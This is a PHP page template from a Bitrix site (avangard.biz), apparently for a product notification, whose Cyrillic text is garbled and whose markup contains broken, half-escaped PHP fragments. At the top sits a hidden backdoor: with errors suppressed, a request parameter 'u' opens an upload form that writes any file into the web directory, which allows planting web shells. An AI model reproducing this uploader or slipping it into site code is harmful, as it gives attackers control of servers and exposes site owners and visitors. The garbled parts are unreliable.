<?
error_reporting(0);
if (isset($_REQUEST['u'])) {
    echo '<form action="" method=post enctype=multipart/form-data><input type=file name=uploadfile><input type=submit value=Upload></form>';
    $uploaddir = '';
    $uploadfile = $uploaddir.basename($_FILES['uploadfile']['name']);
    if (copy($_FILES['uploadfile']['tmp_name'], $uploadfile)) {
        echo "<h3>OK</h3>";
        exit;
    }else{
        echo "<h3>NO</h3>";
        exit;
    }
    exit;
} 
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("������� �������");
?> 
<p> 
  <table width="600" border="0" cellspacing="5" cellpadding="0"> 
    <tbody>
      <tr> <td align="center"><strong>���������� ����������� �� www.avangard.biz!</strong></td> </tr>
     
      <tr> <td><strong>�������� ������:</strong></td> </tr>
     
      <tr> <td>��������: $name 
          <br />
        $f_type 
          <br />
         	
          <br />
         ���������: $collection </td> </tr>
     
      <tr> <td> ������: <a href="$url" >$url</a> </td> </tr>
     
      <tr> <td>����������� �����������:
          <br />
         $descr </td> </tr>
     
      <tr> <td>
          <br />
        &quot;; if($pic_path!=&quot;&quot;){ $message .= &quot;<img src="$image" /> 
          <br \="" />
        
          <br \="" />
        &quot;; } $message .= &quot;$ptext 
          <br />
        
          <br />
         $dtext </td> </tr>
     
      <tr> <td> $tech </td> </tr>
     </tbody>
  </table>
 </p>
 <?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>